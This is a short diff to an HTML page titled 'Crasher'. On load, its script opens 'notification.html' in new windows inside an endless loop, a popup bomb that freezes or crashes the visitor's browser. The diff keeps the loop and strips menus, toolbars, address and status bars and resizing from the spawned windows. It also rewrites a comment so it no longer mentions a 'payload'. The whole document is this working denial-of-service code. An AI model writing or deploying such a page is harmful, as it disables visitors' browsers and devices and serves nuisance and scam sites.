@@ -1,14 +1,19 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
+    <meta charset="UTF-8">
     <title>Crasher</title>
 </head>
 <body>
     <script>
         window.onload = function() {
-            // Aggressive loop to spawn the notification payload windows continuously
+            // Aggressive loop to spawn customized notification windows
             while (true) {
-                window.open('notification.html', '_blank', 'width=400,height=300');
+                window.open(
+                    'notification.html', 
+                    '_blank', 
+                    'width=400,height=300,menubar=no,toolbar=no,location=no,status=no,resizable=no'
+                );
             }
         };
     </script>
